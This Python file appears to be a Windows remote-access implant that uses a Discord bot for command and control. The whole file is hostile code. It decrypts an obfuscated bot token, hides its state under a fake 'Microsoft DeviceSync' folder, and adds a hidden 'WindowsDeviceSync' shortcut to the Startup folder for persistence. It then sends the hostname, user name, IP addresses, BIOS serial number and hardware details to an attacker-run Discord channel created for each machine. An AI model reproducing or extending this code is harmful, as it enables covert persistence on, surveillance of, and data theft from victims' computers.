import os
import sys
import random
import string
import socket
import platform
import getpass
import configparser
import psutil
from cryptography.fernet import Fernet
import discord
from discord.ext import commands

try:
    import win32com.client
except ImportError:
    win32com = None

DEBUG = False
appVersion = "1.0"
appBuild = "".join(random.choices(string.ascii_letters + string.digits, k=4))

_K = b'8QD4GQj018hOrZNcxr3pJ9jsAvRap5YqS7viDDhqVbM='
_C = b'gAAAAABqmk7Xclh9bzaAglADQ5vkVSYmigLvVk0gTglkoy9MIWRm0Cn7VEBX2r-UPzPRQgQj8yYEJaL0RbtC23hQTPk5AGck9E9VJZyAQSZ9QurYZV1dU7mMo5SWaapyZLmAezfRRNumz903YKG0ODeOWIsD8wgZepEF98K1kXR0MgqksFIxF1g='
_TOKEN = Fernet(_K).decrypt(_C).decode()

GUILD_ID = 1530382256122761227
CATEGORY_ID = 1530382256865284126

def get_config_path():
    local_appdata = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
    folder = os.path.join(local_appdata, "Microsoft", "DeviceSync")
    os.makedirs(folder, exist_ok=True)
    return os.path.join(folder, "sync.ini")

def load_config():
    path = get_config_path()
    if not os.path.exists(path):
        return None
    try:
        cp = configparser.ConfigParser()
        cp.read(path, encoding="utf-8")
        if "state" not in cp:
            os.remove(path)
            return None
        prefix = cp.get("state", "prefix", fallback="").strip()
        chid = cp.get("state", "chid", fallback="").strip()
        if not prefix or not prefix.isalpha() or not prefix.islower() or not (2 <= len(prefix) <= 4):
            os.remove(path)
            return None
        return {"prefix": prefix, "chid": chid}
    except Exception:
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass
        return None

def save_config(prefix, chid=""):
    path = get_config_path()
    cp = configparser.ConfigParser()
    cp["state"] = {
        "prefix": prefix,
        "chid": chid
    }
    with open(path, "w", encoding="utf-8") as f:
        cp.write(f)

def ensure_startup_shortcut():
    try:
        if not win32com:
            return
        appdata = os.environ.get("APPDATA")
        if not appdata:
            return
        startup_dir = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir, exist_ok=True)
        shortcut_path = os.path.join(startup_dir, "WindowsDeviceSync.lnk")
        shell = win32com.client.Dispatch("WScript.Shell")
        if os.path.exists(shortcut_path):
            try:
                existing_lnk = shell.CreateShortcut(shortcut_path)
                if os.path.normpath(existing_lnk.TargetPath) == os.path.normpath(sys.executable):
                    return
            except Exception:
                pass
        lnk = shell.CreateShortcut(shortcut_path)
        lnk.TargetPath = sys.executable
        lnk.WorkingDirectory = os.path.dirname(sys.executable)
        lnk.WindowStyle = 7
        lnk.Save()
    except Exception:
        pass

def generate_prefix():
    length = random.randint(2, 4)
    return "".join(random.choices(string.ascii_lowercase, k=length))

def query_wmi(query, attrs):
    try:
        if win32com:
            wmi = win32com.client.GetObject("winmgmts:")
            items = wmi.ExecQuery(query)
            for item in items:
                parts = []
                for a in attrs:
                    val = getattr(item, a, None)
                    if val is not None:
                        parts.append(str(val).strip())
                if parts:
                    return " - ".join(parts)
    except Exception:
        pass
    return "N/A"

def get_sys_info(prefix_str):
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "N/A"
    try:
        user = getpass.getuser()
    except Exception:
        user = "N/A"
    try:
        ver = platform.version()
        parts = ver.split(".")
        major = int(parts[0]) if len(parts) > 0 else 0
        build = int(parts[2]) if len(parts) > 2 else 0
        if major == 6:
            friendly = "Windows 8"
        elif major == 10 and build >= 22000:
            friendly = "Windows 11"
        elif major == 10:
            friendly = "Windows 10"
        else:
            friendly = "Windows"
        os_info = f"{platform.system()} ({friendly}) {ver}"
    except Exception:
        os_info = f"{platform.system()} {platform.version()}"

    v4_list, v6_list = [], []
    try:
        net_addrs = psutil.net_if_addrs()
        for iface, addrs in net_addrs.items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ip = addr.address
                    if not ip.startswith("127.") and not ip.startswith("169.254."):
                        v4_list.append(ip)
                elif addr.family == socket.AF_INET6:
                    ip = addr.address
                    if ip != "::1" and not ip.lower().startswith("fe80"):
                        v6_list.append(ip)
    except Exception:
        pass
    v4_str = ", ".join(v4_list) if v4_list else "N/A"
    v6_str = ", ".join(v6_list) if v6_list else "N/A"

    serial_no = query_wmi("SELECT SerialNumber FROM Win32_BIOS", ["SerialNumber"])
    mfg_model = query_wmi("SELECT Manufacturer, Model FROM Win32_ComputerSystem", ["Manufacturer", "Model"])
    cpu_info = query_wmi("SELECT Name, NumberOfCores, MaxClockSpeed FROM Win32_Processor", ["Name", "NumberOfCores", "MaxClockSpeed"])

    try:
        ram_total = psutil.virtual_memory().total / (1024 ** 3)
        ram_str = f"{ram_total:.2f} GiB"
    except Exception:
        ram_str = "N/A"

    try:
        drive_path = "C:\\" if os.name == "nt" else "/"
        usage = psutil.disk_usage(drive_path)
        t_gib = usage.total / (1024 ** 3)
        u_gib = usage.used / (1024 ** 3)
        f_gib = usage.free / (1024 ** 3)
        disk_str = f"{t_gib:.2f} GiB Total / {u_gib:.2f} GiB Used / {f_gib:.2f} GiB Free"
    except Exception:
        disk_str = "N/A"

    embed = discord.Embed(title="System Information", color=0x2b2d31)
    embed.add_field(name="Hostname", value=hostname, inline=True)
    embed.add_field(name="Current User", value=user, inline=True)
    embed.add_field(name="Operating System", value=os_info, inline=False)
    embed.add_field(name="IPv4", value=v4_str, inline=True)
    embed.add_field(name="IPv6", value=v6_str, inline=True)
    embed.add_field(name="Serial Number", value=serial_no, inline=True)
    embed.add_field(name="Manufacturer & Model", value=mfg_model, inline=True)
    embed.add_field(name="CPU", value=cpu_info, inline=False)
    embed.add_field(name="RAM", value=ram_str, inline=True)
    embed.add_field(name="Disk", value=disk_str, inline=True)
    embed.add_field(name="Prefix", value=f"{prefix_str}!", inline=True)
    embed.add_field(name="App Version", value=appVersion, inline=True)
    embed.add_field(name="App Build", value=appBuild, inline=True)
    return embed

def create_online_embed(prefix_str):
    return discord.Embed(
        title="Machine Online",
        description=f"Prefix: {prefix_str}!",
        color=0x57f287,
        timestamp=discord.utils.utcnow()
    )

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

_boot_completed = False

@bot.event
async def on_ready():
    global _boot_completed
    if _boot_completed:
        return
    _boot_completed = True

    cfg = load_config()
    is_new = False
    if not cfg:
        prefix_val = generate_prefix()
        save_config(prefix_val, "")
        cfg = {"prefix": prefix_val, "chid": ""}
        is_new = True
    else:
        prefix_val = cfg["prefix"]

    bot.command_prefix = prefix_val + "!"

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        try:
            guild = await bot.fetch_guild(GUILD_ID)
        except Exception:
            guild = None

    if not guild:
        return

    category = guild.get_channel(CATEGORY_ID)
    if not category:
        try:
            category = await bot.fetch_channel(CATEGORY_ID)
        except Exception:
            category = None

    channel = None
    chid_str = cfg.get("chid", "")
    if chid_str and not is_new:
        try:
            channel = bot.get_channel(int(chid_str))
            if not channel:
                channel = await bot.fetch_channel(int(chid_str))
        except Exception:
            channel = None

    if not channel:
        try:
            if category and hasattr(category, "create_text_channel"):
                channel = await category.create_text_channel(name=prefix_val)
            else:
                channel = await guild.create_text_channel(name=prefix_val, category=category)
            save_config(prefix_val, str(channel.id))
            embed = get_sys_info(prefix_val)
            await channel.send(embed=embed)
        except Exception:
            pass
    else:
        try:
            embed = create_online_embed(prefix_val)
            await channel.send(embed=embed)
        except Exception:
            pass

ensure_startup_shortcut()
bot.run(_TOKEN)
